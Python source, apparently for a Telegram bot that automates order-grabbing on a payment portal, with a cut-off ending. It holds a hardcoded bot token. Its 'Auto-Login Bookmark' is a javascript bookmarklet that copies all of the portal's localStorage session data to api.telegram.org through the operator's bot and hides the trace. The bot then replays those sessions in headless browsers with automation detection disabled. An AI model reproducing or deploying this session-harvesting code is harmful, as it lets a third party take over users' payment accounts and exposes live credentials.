import asyncio, re, json, os, io, threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timezone, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    filters, ContextTypes, ConversationHandler
)
from playwright.async_api import async_playwright

BOT_TOKEN = "8737580198:AAG2jDYE-5YI1WbufZYp2oGrzL0ZQu-7pfE"

# Admin ID
ADMIN_ID = 5773956827

# Channel & Paid Bot Links
FORCE_GROUP_USERNAME = "arbsupportagent"
FORCE_CHANNEL_LINK = "https://t.me/arbsupportagent"
PAID_BOT_LINK = "https://t.me/Arbpayalert_bot"

ACCOUNTS_FILE = "accounts_session.json"
CONFIG_FILE = "last_configs.json"
BM_NOTIFIED_FILE = "bookmark_notified.json"
DAILY_USAGE_FILE = "daily_usage.json"
PROMO_CODES_FILE = "promo_codes.json"
SESSION_DIR = "browser_sessions"

ASK_PHONE, ASK_SESSION = range(2)
user_sessions = {}
user_range_selection = {}
user_tab_selection = {}
user_pay_selection = {}
last_sync_ts = 0

DEFAULT_DAILY_LIMIT = 3
IST = timezone(timedelta(hours=5, minutes=30))

RANGES_BANK = [
    "500-699", "700-999", "1000-1499", "1500-1999",
    "2000-2000", "2001-2999", "3000-3000", "3001-4999",
    "5000-5000", "5001-6999", "7000-9999", "10000-14999", "15000-19999"
]
RANGES_OTP = [
    "500-699", "700-999", "1000-1499", "1500-1999",
    "2000-2000", "2001-2999", "3000-4999", "5000-5000",
    "5001-6999", "7000-9999", "10000-14999", "15000-19999"
]

class DummyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Free Bot Active!")

def run_dummy_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(("0.0.0.0", port), DummyServer)
    server.serve_forever()

def get_ist_now():
    return datetime.now(IST)

def get_ist_date_str():
    return get_ist_now().strftime("%Y-%m-%d")

def fmt_num(v: float) -> str:
    return str(int(round(v))) if abs(v - round(v)) < 0.01 else f"{v:.2f}"

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

def get_user_usage_stats(user_id: int):
    data = load_json(DAILY_USAGE_FILE, {})
    today = get_ist_date_str()
    u_key = str(user_id)
    if u_key not in data or data[u_key].get("date") != today:
        data[u_key] = {"date": today, "count": 0, "max_limit": DEFAULT_DAILY_LIMIT, "redeemed_codes": []}
        save_json(DAILY_USAGE_FILE, data)
        return 0, DEFAULT_DAILY_LIMIT, DEFAULT_DAILY_LIMIT
    
    used = data[u_key].get("count", 0)
    max_limit = data[u_key].get("max_limit", DEFAULT_DAILY_LIMIT)
    left = max(0, max_limit - used)
    return used, left, max_limit

def check_user_daily_limit(user_id: int) -> bool:
    used, left, max_limit = get_user_usage_stats(user_id)
    return left > 0

def increment_user_daily_count(user_id: int) -> int:
    data = load_json(DAILY_USAGE_FILE, {})
    today = get_ist_date_str()
    u_key = str(user_id)
    if u_key not in data or data[u_key].get("date") != today:
        data[u_key] = {"date": today, "count": 1, "max_limit": DEFAULT_DAILY_LIMIT, "redeemed_codes": []}
    else:
        data[u_key]["count"] = data[u_key].get("count", 0) + 1
    save_json(DAILY_USAGE_FILE, data)
    return data[u_key]["count"]

async def is_member_of_group(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    target_chat = f"@{FORCE_GROUP_USERNAME}"
    try:
        member = await context.bot.get_chat_member(chat_id=target_chat, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        return False
    except Exception as e:
        print(f"DEBUG: Membership check error: {e}")
        return False

def get_force_join_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Group Pehle", url=FORCE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ Check Membership", callback_data="check_join")]
    ])

def generate_user_bookmarklet(uid, phone) -> str:
    return (
        f"javascript:(function(){{var d={{}};for(var i=0;i<localStorage.length;i++){{var k=localStorage.key(i);d[k]=localStorage.getItem(k);}}"
        f"var fd=new FormData();fd.append('chat_id','{uid}');"
        f"fd.append('document',new Blob([JSON.stringify(d)],{{type:'application/json'}}),'sync_{uid}_{phone}.json');"
        f"fetch('https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',{{method:'POST',body:fd}})"
        f".then(r=>r.json()).then(res=>{{if(res.ok){{var fid=res.result.document.file_id;var mid=res.result.message_id;"
        f"fetch('https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage?chat_id={uid}&message_id='+mid);"
        f"var p=JSON.stringify({{u:'{uid}',p:'{phone}',f:fid,t:Date.now()}});"
        f"fetch('https://api.telegram.org/bot{BOT_TOKEN}/setMyDescription',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{description:p,language_code:'zu'}})}})"
        f".then(()=>alert('✅ Account {phone} Login Sync Ho Gaya! Bot me /start karein.'));"
        f"}}else{{alert('❌ Error: '+JSON.stringify(res));}}}}).catch(e=>alert('❌ Network Error: '+e));}})();"
    )

def load_last_configs():
    return load_json(CONFIG_FILE, {})

def save_last_config(phone, tab, rng, app):
    confs = load_last_configs()
    confs[phone] = {"tab": tab, "range": rng, "app": app}
    save_json(CONFIG_FILE, confs)

def calculate_commission(amount: float) -> float:
    if amount <= 2000:
        return round((amount * 0.03) + 5.0, 2)
    return round(amount * 0.03, 2)

def load_accounts():
    data = load_json(ACCOUNTS_FILE, {})
    return data if isinstance(data, dict) else {}

def get_user_accounts(user_id: int):
    all_acc_db = load_accounts()
    return dict(all_acc_db.get(str(user_id), {}))

def save_accounts(data):
    save_json(ACCOUNTS_FILE, data)

def get_active_sessions_for_user(chat_id_int: int):
    prefix = f"{chat_id_int}_"
    return [k for k in user_sessions.keys() if k.startswith(prefix) and user_sessions[k].get("running")]

def save_user_session_clean(uid_str: str, phone: str, sess_json: dict):
    accs = load_accounts()
    accs[uid_str] = {phone: sess_json}
    save_accounts(accs)

async def poll_bookmark_sync(context: ContextTypes.DEFAULT_TYPE):
    global last_sync_ts
    try:
        desc_obj = await context.bot.get_my_description(language_code="zu")
        raw = (desc_obj.description or "").strip()
        if not raw or not raw.startswith("{"):
            return
        data = json.loads(raw)
        ts = int(data.get("t", 0))
        if ts <= last_sync_ts:
            return
        last_sync_ts = ts
        uid = str(data.get("u", "")).strip()
        phone = str(data.get("p", "")).strip()
        fid = str(data.get("f", "")).strip()
        if not uid or not phone or not fid:
            return
        tg_file = await context.bot.get_file(fid)
        b_arr = await tg_file.download_as_bytearray()
        sess_json = json.loads(b_arr.decode("utf-8"))
        if isinstance(sess_json, dict) and len(sess_json) > 0:
            save_user_session_clean(uid, phone, sess_json)
            await context.bot.set_my_description(description="", language_code="zu")
            await context.bot.send_message(
                chat_id=int(uid),
                text=f"✅ **Account `{phone}` ka Login Session Fresh Sync Ho Gaya!**\n\nAb `/start` dabakar matching shuru karein.",
                parse_mode="Markdown"
            )
    except Exception:
        pass

async def check_is_login_page(page) -> bool:
    try:
        return await page.evaluate(r"""
            () => {
                const txt = (document.body.innerText || '').toLowerCase();
                if (txt.includes('account login')) return true;
                if (txt.includes('please enter your login password')) return true;
                if (txt.includes('forgot password') && txt.includes('log in')) return true;
                if (txt.includes('no account') && txt.includes('register now')) return true;
                const hasPass = document.querySelector('input[type="password"]') !== null;
                if (hasPass && (txt.includes('login') || txt.includes('log in') || txt.includes('sign in'))) return true;
                return false;
            }
        """)
    except Exception:
        return False

async def send_login_expired_alert(chat_id, phone, s_key, page, context, query_or_msg=None):
    try:
        shot = await page.screenshot()
        caption_text = (
            f"⚠️ **Login Expire Ho Gaya Hai!** (`{phone}`)\n\n"
            f"Aapka account portal se logout ho gaya hai. Kripya portal par login karke bookmark dubara run karein, login sync ho jayega."
        )
        buttons = [[InlineKeyboardButton("⛔ Close", callback_data=f"stop_{phone}")]]
        markup = InlineKeyboardMarkup(buttons)
        if query_or_msg and hasattr(query_or_msg, 'edit_message_caption'):
            try:
                await query_or_msg.edit_message_caption(caption=caption_text, reply_markup=markup, parse_mode="Markdown")
            except Exception:
                await context.bot.send_photo(chat_id=chat_id, photo=shot, caption=caption_text, reply_markup=markup, parse_mode="Markdown")
        else:
            await context.bot.send_photo(chat_id=chat_id, photo=shot, caption=caption_text, reply_markup=markup, parse_mode="Markdown")
    except Exception:
        pass
    await stop_single_session(s_key, context, notify=False)

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        return

    user = update.effective_user
    if not user:
        return
    user_id = user.id
    chat_id_int = update.effective_chat.id

    is_joined = await is_member_of_group(user_id, context)
    if not is_joined:
        join_msg = (
            "⚠️ **Group Join Karna Anivarya Hai!**\n\n"
            "Free Bot ko chalane ke liye pehle hamare official group ko join karein.\n\n"
            f"👉 Niche button se group join karein, fir **'Check Membership'** dabayein:"
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(join_msg, reply_markup=get_force_join_markup(), parse_mode="Markdown")
        else:
            await update.message.reply_text(join_msg, reply_markup=get_force_join_markup(), parse_mode="Markdown")
        return

    used_orders, left_orders, max_limit = get_user_usage_stats(user_id)
    if left_orders <= 0:
        limit_msg = (
            "⛔ **Aapki Free Trial Limit Khatam Ho Gayi Hai!**\n\n"
            f"📊 **Aaj Ke Orders:** `{used_orders}/{max_limit}` (Bacha hai: 0)\n\n"
            f"Free Bot me rozana sirf **{max_limit} Orders Match** karne ki limit hai.\n\n"
            "🚀 **Unlimited Orders ke liye hamara Full Bot use karein:**\n"
            f"👉 [Click Here To Open Arbpay Bot]({PAID_BOT_LINK})"
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(limit_msg, parse_mode="Markdown", disable_web_page_preview=True)
        else:
            await update.message.reply_text(limit_msg, parse_mode="Markdown", disable_web_page_preview=True)
        return

    context.user_data.clear()
    accounts = get_user_accounts(user_id)
    active_keys = get_active_sessions_for_user(chat_id_int)
    active_phones = [user_sessions[k].get("phone", "") for k in active_keys]

    buttons = []
    for phone in accounts.keys():
        if phone in active_phones:
            buttons.append([InlineKeyboardButton(f"🟢 {phone} (Running - Stop)", callback_data=f"stop_{phone}")])
        else:
            buttons.append([InlineKeyboardButton(f"📱 {phone} (Start)", callback_data=f"choose_{phone}")])

    if len(accounts) > 0:
        buttons.append([InlineKeyboardButton("🔄 Change Account", callback_data="add_acc")])
    else:
        buttons.append([InlineKeyboardButton("➕ Add Account", callback_data="add_acc")])

    if active_keys:
        buttons.append([InlineKeyboardButton("⛔ Stop All Tasks", callback_data="stop_all")])

    txt = (
        "👋 **AR Wallet Free Trial Bot**\n"
        f"📊 **Aaj Ki Limit:** `{used_orders}/{max_limit}` Orders Used\n"
        f"🎯 **Bacha Hua Limit:** `{left_orders}` Order\n\n"
        "Apna account chunein ya change karein:"
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    else:
        await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

async def detail_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        return
    
    msg = (
        "🔒 **Feature Locked in Free Version!**\n\n"
        "📊 Detailed Reports, Commission Analytics, aur Daily Order History sirf **Paid / Premium Bot** me available hai.\n\n"
        "🚀 **Full Bot me Switch karne ke liye link:**\n"
        f"👉 [Click Here To Open Arbpay Bot]({PAID_BOT_LINK})"
    )
    markup = InlineKeyboardMarkup([[InlineKeyboardButton("🚀 Go to Arbpay Paid Bot", url=PAID_BOT_LINK)]])
    await update.message.reply_text(msg, reply_markup=markup, parse_mode="Markdown", disable_web_page_preview=True)

async def setcode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        return
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return

    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Usage:\n`/setcode 5 /gigiyrigdsyydiyjg46575` ya `/setcode 5 gigiyrigdsyydiyjg46575`", parse_mode="Markdown")
        return

    try:
        limit_val = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Limit number hona chahiye! Example: `/setcode 5 mycode123`", parse_mode="Markdown")
        return

    raw_code = context.args[1].strip()
    code_clean = raw_code.lstrip("/").lower()

    promo_db = load_json(PROMO_CODES_FILE, {})
    promo_db[code_clean] = limit_val
    save_json(PROMO_CODES_FILE, promo_db)

    await update.message.reply_text(
        f"✅ **Secret Code Saved Successfully!**\n\n"
        f"🔑 **Code:** `/{code_clean}`\n"
        f"🎁 **Reward:** +{limit_val} Daily Limit\n\n"
        f"Users `/{code_clean}` enter karke limit claim kar sakte hain.",
        parse_mode="Markdown"
    )

async def text_or_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    if update.effective_chat.type in ["group", "supergroup"]:
        return

    user_id = update.effective_user.id
    msg_text = update.message.text.strip()
    code_entered = msg_text.lstrip("/").lower()

    promo_db = load_json(PROMO_CODES_FILE, {})

    if code_entered in promo_db:
        extra_limit = int(promo_db[code_entered])
        data = load_json(DAILY_USAGE_FILE, {})
        today = get_ist_date_str()
        u_key = str(user_id)

        if u_key not in data or data[u_key].get("date") != today:
            data[u_key] = {"date": today, "count": 0, "max_limit": DEFAULT_DAILY_LIMIT, "redeemed_codes": []}

        user_info = data[u_key]
        redeemed = user_info.get("redeemed_codes", [])

        if code_entered in redeemed:
            await update.message.reply_text("⚠️ **Aap yeh code aaj pehle hi use kar chuke hain!** Kal dobara use kar sakte hain.")
            return

        redeemed.append(code_entered)
        user_info["redeemed_codes"] = redeemed
        user_info["max_limit"] = user_info.get("max_limit", DEFAULT_DAILY_LIMIT) + extra_limit
        save_json(DAILY_USAGE_FILE, data)

        used, left, max_limit = get_user_usage_stats(user_id)
        await update.message.reply_text(
            f"🎉 **Secret Code Applied!**\n\n"
            f"➕ Added: +{extra_limit} Orders\n"
            f"📊 Total Limit: `{max_limit}` Orders\n"
            f"🎯 Bacha Hua Limit: `{left}` Orders\n\n"
            f"Ab `/start` dabakar matching start karein!",
            parse_mode="Markdown"
        )
        return

async def dismiss_all_popups(page):
    for _ in range(4):
        try:
            clicked = await page.evaluate(r"""
                () => {
                    let hit = false;
                    const all = Array.from(document.querySelectorAll('button, div, span, a, i, svg'));
                    for (let el of all) {
                        const t = (el.innerText || '').trim();
                        if (t === 'Close' || t === 'Go buy' || t === 'Confirm' || t === 'IKnow') {
                            const r = el.getBoundingClientRect();
                            if (r.width > 20 && r.height > 15 && r.height < 90) {
                                el.click();
                                hit = true;
                            }
                        }
                    }
                    return hit;
                }
            """)
            await asyncio.sleep(0.4)
            if not clicked:
                break
        except Exception:
            break

async def extract_exact_amount(page, body_text: str) -> str:
    try:
        dom_val = await page.evaluate(r"""
            () => {
                const allElements = Array.from(document.querySelectorAll('*'));
                for (let el of allElements) {
                    const t = (el.innerText || '').trim();
                    const m = t.match(/^₹\s*([0-9,]+(\.[0-9]{2})?)$/);
                    if (m && m[1]) {
                        const v = m[1].replace(/,/g, '');
                        if (parseFloat(v) >= 100 && v !== '110.00') return v;
                    }
                }
                return null;
            }
        """)
        if dom_val:
            return dom_val
        m = re.findall(r'₹\s*([0-9,]+(?:\.[0-9]{2})?)', body_text)
        for val in m:
            clean = val.replace(',', '')
            if float(clean) >= 100 and clean != '110.00':
                return clean
    except Exception:
        pass
    return "Check Screenshot"

async def send_order_matched_alert(session_key, page, context, body_text):
    s = user_sessions.get(session_key)
    if not s:
        return
    chat_id = s["chat_id"]
    phone = s.get("phone", "")
    amt = await extract_exact_amount(page, body_text)
    try:
        clean_num = float(amt.replace(',', ''))
    except Exception:
        clean_num = 0.0
    comm = calculate_commission(clean_num)
    photo = await page.screenshot()
    s["running"] = False

    count = increment_user_daily_count(chat_id)
    used, left, max_limit = get_user_usage_stats(chat_id)

    caption_text = (
        f"🚨🚨 **ORDER MATCH HO GAYA!** 🔔\n\n"
        f"📱 **Account: `{phone}`**\n"
        f"💰 **Amount: ₹ {amt}**\n"
        f"💵 **Commission: +₹ {comm}**\n\n"
        f"📊 **Aaj Ke Orders:** `{count}/{max_limit}` (Bacha hai: `{left}`)\n"
    )

    if left <= 0:
        caption_text += (
            f"\n⚠️ **Aapki Free Trial Limit ({max_limit}/{max_limit}) Khatam Ho Gayi Hai!**\n"
            f"👉 Unlimited orders ke liye hamare paid bot par switch karein: [Arbpay Bot]({PAID_BOT_LINK})"
        )
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🚀 Go to Unlimited Bot", url=PAID_BOT_LINK)]])
    else:
        buttons = [[InlineKeyboardButton("🔁 Repeat Order", callback_data=f"orderrepeat_{phone}")]]
        markup = InlineKeyboardMarkup(buttons)

    await context.bot.send_photo(
        chat_id,
        photo=photo,
        caption=caption_text,
        reply_markup=markup,
        parse_mode="Markdown"
    )
    await stop_single_session(session_key, context, notify=True)

async def click_back_to_order_list_clean(page):
    for _ in range(3):
        try:
            body = await page.inner_text("body")
            if "Cancel Matching" in body:
                await page.evaluate(r"""
                    () => {
                        const all = Array.from(document.querySelectorAll('button, div, span, a, p'));
                        for (let el of all.reverse()) {
                            if ((el.innerText || '').trim().includes('Cancel Matching')) {
                                el.click();
                                break;
                            }
                        }
                    }
                """)
                await asyncio.sleep(1.2)
            body = await page.inner_text("body")
            if "Back to Order List" in body or "No match found" in body:
                await page.evaluate(r"""
                    () => {
                        const all = Array.from(document.querySelectorAll('button, div, span, a, p'));
                        for (let el of all.reverse()) {
                            if ((el.innerText || '').trim().includes('Back to Order List')) {
                                el.click();
                                break;
                            }
                        }
                    }
                """)
                await asyncio.sleep(1.5)
            else:
                break
        except Exception:
            break

async def ensure_on_buy_page(page):
    await dismiss_all_popups(page)
    cur_url = (page.url or "").lower()
    if "/#/buy/arb" not in cur_url:
        try:
            await page.goto("https://clbsk.paywivo.com/#/buy/arb", wait_until="domcontentloaded", timeout=20000)
            await asyncio.sleep(2)
        except Exception:
            pass
    await dismiss_all_popups(page)

async def switch_tab(page, tab_name: str):
    await ensure_on_buy_page(page)
    await click_back_to_order_list_clean(page)
    clicked = await page.evaluate(r"""
        (tName) => {
            const tabs = Array.from(document.querySelectorAll('div, span, p'));
            for (let el of tabs) {
                if ((el.innerText || '').trim() === tName) {
                    el.click();
                    return true;
                }
            }
            return false;
        }
    """, tab_name)
    if not clicked:
        if tab_name == "BANK":
            await page.touchscreen.tap(240, 128)
        else:
            await page.touchscreen.tap(125, 128)
    await asyncio.sleep(1.0)
    await click_back_to_order_list_clean(page)

async def detect_live_payment_options(page):
    for _ in range(4):
        apps = await page.evaluate(r"""
            () => {
                const all = Array.from(document.querySelectorAll('*'));
                let useAnotherNode = null;
                for (let el of all) {
                    const t = (el.innerText || '').trim().toLowerCase();
                    if (t === 'use another account' || t === 'payment method' || t === 'select payment') {
                        useAnotherNode = el;
                        break;
                    }
                }
                const foundApps = [];
                const checkList = ['phonepe', 'paytm', 'navi', 'airtel', 'freecharge', 'supermoney'];
                if (useAnotherNode) {
                    useAnotherNode.scrollIntoView({ behavior: 'instant', block: 'center' });
                    const parent = useAnotherNode.parentElement || useAnotherNode;
                    const candidates = Array.from(parent.querySelectorAll('*'));
                    const startIdx = candidates.indexOf(useAnotherNode);
                    for (let i = startIdx + 1; i < candidates.length; i++) {
                        const c = candidates[i];
                        const t = (c.innerText || '').trim().toLowerCase();
                        for (let app of checkList) {
                            if (t === app && !foundApps.includes(c.innerText.trim())) {
                                foundApps.push(c.innerText.trim());
                            }
                        }
                    }
                }
                if (foundApps.length === 0) {
                    for (let el of all) {
                        const t = (el.innerText || '').trim().toLowerCase();
                        for (let app of checkList) {
                            if (t === app && !foundApps.includes(el.innerText.trim())) {
                                foundApps.push(el.innerText.trim());
                            }
                        }
                    }
                }
                return foundApps;
            }
        """)
        if apps:
            return apps
        await page.mouse.wheel(0, 300)
        await asyncio.sleep(0.6)
    return ["PhonePe"]

async def click_strictly_another_account(page, app_name: str) -> bool:
    target = app_name.lower()
    for _ in range(5):
        clicked = await page.evaluate(r"""
            (targetApp) => {
                const target = targetApp.toLowerCase();
                const all = Array.from(document.querySelectorAll('*'));
                for (let el of all) {
                    const t = (el.innerText || '').trim().toLowerCase();
                    if (t === target) {
                        el.click();
                        return true;
                    }
                }
                return false;
            }
        """, target)
        if clicked:
            return True
        await page.mouse.wheel(0, 350)
        await asyncio.sleep(0.6)
    await page.touchscreen.tap(200, 715)
    return True

async def select_and_strictly_verify_tag(page, target_range: str) -> bool:
    await dismiss_all_popups(page)
    await click_back_to_order_list_clean(page)
    clean_target = target_range.replace(" ", "")
    try:
        await page.evaluate(r"""
            () => {
                const all = Array.from(document.querySelectorAll('*'));
                for (let el of all) {
                    if ((el.innerText || '').trim().toLowerCase().includes('show all ranges')) {
                        el.click();
                        return true;
                    }
                }
                return false;
            }
        """)
        await asyncio.sleep(0.4)
    except Exception:
        pass
    for _ in range(8):
        res = await page.evaluate(r"""
            (tRange) => {
                const target = tRange.replace(/\s+/g, '');
                const all = Array.from(document.querySelectorAll('div, span, button, p'));
                for (let el of all) {
                    const text = (el.innerText || '').trim().replace(/\s+/g, '');
                    if (text === target || text === ('₹' + target)) {
                        el.scrollIntoView({ behavior: 'instant', inline: 'center', block: 'center' });
                        el.click();
                        return { found: true };
                    }
                }
                return { found: false };
            }
        """, clean_target)
        if res.get("found"):
            await asyncio.sleep(1.0)
            return True
        await page.mouse.move(340, 395)
        await page.mouse.down()
        await page.mouse.move(30, 395, steps=10)
        await page.mouse.up()
        await asyncio.sleep(0.6)
    return False

async def add_acc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    
    if not await is_member_of_group(user_id, context):
        await query.answer("Pehle group join karein!", show_alert=True)
        await start_cmd(update, context)
        return ConversationHandler.END

    await query.answer()
    await query.edit_message_text("👉 Apna **10-digit Phone Number** bhejein:", parse_mode="Markdown")
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Sahi 10-digit number dalein:", reply_markup=ReplyKeyboardRemove())
        return ASK_PHONE
    chat_id = str(update.effective_chat.id)
    context.user_data['temp_phone'] = phone
    
    bm = generate_user_bookmarklet(chat_id, phone)
    msg = (
        f"✅ **Number `{phone}` Register Ho Gaya!**\n\n"
        f"🔖 **Aapka `{phone}` Auto-Login Bookmark:**\n\n"
        f"`{bm}`\n\n"
        f"📌 **Kaise Use Karein:**\n"
        f"1. Browser me is code ka Bookmark banayein.\n"
        f"2. Portal me `{phone}` login karke ye Bookmark dabayein.\n"
        f"3. Session auto-sync ho jayega! Fir `/start` karein."
    )
    await update.message.reply_text(msg, reply_markup=ReplyKeyboardRemove(), parse_mode="Markdown")
    return ConversationHandler.END

async def get_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = context.user_data.get('temp_phone')
    chat_id = str(update.effective_chat.id)
    if update.message.document:
        doc_file = await update.message.document.get_file()
        byte_data = await doc_file.download_as_bytearray()
        raw_data = byte_data.decode('utf-8')
    else:
        raw_data = update.message.text.strip()
    try:
        parsed_json = json.loads(raw_data)
    except Exception:
        await update.message.reply_text("❌ File sahi nahi hai! Bookmark run karein ya valid JSON bhejein:", reply_markup=ReplyKeyboardRemove())
        return ASK_SESSION
    
    save_user_session_clean(chat_id, phone, parsed_json)
    
    await update.message.reply_text(f"🎉 **Account `{phone}` Save Ho Gaya!**\nAb matching ke liye `/start` karein.", reply_markup=ReplyKeyboardRemove(), parse_mode="Markdown")
    return ConversationHandler.END

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("Process cancel ho gaya. /start karein.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        return
    await stop_all_user_sessions(update.effective_chat.id, context)

async def stop_single_session(session_key, context, notify=True):
    if session_key in user_sessions:
        s = user_sessions[session_key]
        s["running"] = False
        try:
            if "browser_context" in s:
                await s["browser_context"].close()
        except Exception:
            pass
        phone = s.get("phone", "")
        chat_id = s.get("chat_id")
        del user_sessions[session_key]
        if notify:
            await context.bot.send_message(chat_id, f"🛑 **Session STOP ho gaya** ({phone}).", reply_markup=ReplyKeyboardRemove(), parse_mode="Markdown")

async def stop_all_user_sessions(chat_id_int, context):
    active_keys = get_active_sessions_for_user(chat_id_int)
    if active_keys:
        for k in list(active_keys):
            await stop_single_session(k, context)
    else:
        await context.bot.send_message(chat_id_int, "ℹ️ Koi active running task nahi hai.", reply_markup=ReplyKeyboardRemove())

async def run_direct_session(chat_id, phone, session_data, context, auto_start_matching=False):
    s_key = f"{chat_id}_{phone}"
    user_profile_dir = os.path.join(SESSION_DIR, f"profile_{chat_id}_{phone}")
    os.makedirs(user_profile_dir, exist_ok=True)
    
    try:
        async with async_playwright() as p:
            browser_context = await p.chromium.launch_persistent_context(
                user_data_dir=user_profile_dir,
                headless=True,
                viewport={"width": 390, "height": 844},
                user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
                args=[
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-setuid-sandbox",
                    "--no-first-run",
                    "--disable-blink-features=AutomationControlled"
                ]
            )
            
            page = await browser_context.new_page()
            user_sessions[s_key] = {"browser_context": browser_context, "page": page, "phone": phone, "chat_id": chat_id, "running": True}
            
            try:
                target_url = "https://clbsk.paywivo.com/#/buy/arb"
                if session_data and isinstance(session_data, dict) and len(session_data) > 0:
                    await page.goto("https://clbsk.paywivo.com", wait_until="commit", timeout=25000)
                    await page.wait_for_load_state("domcontentloaded")
                    await asyncio.sleep(1.0)
                    await page.evaluate(r"""
                        (storageMap) => {
                            for (let k in storageMap) {
                                const val = typeof storageMap[k] === 'object' ? JSON.stringify(storageMap[k]) : storageMap[k];
                                localStorage.setItem(k, val);
                            }
                        }
                    """, session_data)
                
                await page.goto(target_url, wait_until="domcontentloaded")
                await asyncio.sleep(2.5)
                await dismiss_all_popups(page)
                
                if await check_is_login_page(page):
                    await send_login_expired_alert(chat_id, phone, s_key, page, context)
                    return
                
                await click_back_to_order_list_clean(page)
                
                if auto_start_matching:
                    confs = load_last_configs().get(phone, {})
                    target_range = confs.get("range", "2001-2999")
                    target_tab = confs.get("tab", "OTP-UPI")
                    app_name = confs.get("app", "PhonePe")
                    
                    user_tab_selection[s_key] = target_tab
                    user_range_selection[s_key] = target_range
                    user_pay_selection[s_key] = app_name
                    
                    await switch_tab(page, target_tab)
                    await asyncio.sleep(1.0)
                    await select_and_strictly_verify_tag(page, target_range)
                    await asyncio.sleep(1.2)
                    buy_tapped = False
                    buys = page.locator('button:has-text("Buy"), div:has-text("Buy")')
                    for i in range(await buys.count()):
                        box = await buys.nth(i).bounding_box()
                        if box and box['y'] > 300 and box['x'] > 200:
                            await page.touchscreen.tap(box['x'] + box['width']/2, box['y'] + box['height']/2)
                            buy_tapped = True
                            break
                    if not buy_tapped:
                        await page.touchscreen.tap(350, 420)
                    await asyncio.sleep(2.0)
                    await click_strictly_another_account(page, app_name)
                    await asyncio.sleep(2.5)
                    
                    check_txt = await page.inner_text("body")
                    if any(k in check_txt for k in ["Countdown to Expiry", "Use Mobile Scan code", "Input or Paste UTR", "Matched, pending payment"]):
                        await send_order_matched_alert(s_key, page, context, check_txt)
                        return
                    
                    start_shot = await page.screenshot()
                    await context.bot.send_photo(chat_id, photo=start_shot, caption=f"🚀 **Fast Repeat Matching Started!** ({phone} | [{target_tab}] {target_range} | {app_name})", disable_notification=True)
                    asyncio.create_task(matching_monitor(s_key, page, context))
                else:
                    buttons = [
                        [InlineKeyboardButton("⚡ OTP-UPI", callback_data=f"tab_OTP-UPI_{phone}"), InlineKeyboardButton("🏦 BANK", callback_data=f"tab_BANK_{phone}")],
                        [InlineKeyboardButton(f"⛔ Stop {phone}", callback_data=f"stop_{phone}")]
                    ]
                    await context.bot.send_message(chat_id, f"✅ **`{phone}` Ready!**\n\n1️⃣ Kaunse **Tab** me matching chalani hai?", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
                
                while s_key in user_sessions and user_sessions[s_key]["running"]:
                    await asyncio.sleep(1)
            except Exception as e:
                if s_key in user_sessions and user_sessions[s_key]["running"]:
                    await context.bot.send_message(chat_id, f"❌ Error ({phone}): {str(e)}")
                try:
                    await browser_context.close()
                except Exception:
                    pass
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ Browser Launch Error ({phone}): {str(e)}")
        if s_key in user_sessions:
            del user_sessions[s_key]

async def matching_monitor(session_key, page, context):
    round_count = 2
    while session_key in user_sessions and user_sessions[session_key]["running"]:
        try:
            if await check_is_login_page(page):
                s = user_sessions.get(session_key)
                if s:
                    await send_login_expired_alert(s["chat_id"], s["phone"], session_key, page, context)
                break
            body_text = await page.inner_text("body")
            if any(k in body_text for k in ["Countdown to Expiry", "Use Mobile Scan code", "Input or Paste UTR", "Matched, pending payment"]):
                await send_order_matched_alert(session_key, page, context, body_text)
                break
            ui_state = await page.evaluate(r"""
                () => {
                    const txt = document.body.innerText || '';
                    const hasSearching = txt.includes('Searching available orders');
                    const hasNoMatch = txt.includes('No match found') || txt.includes('multiple attempts');
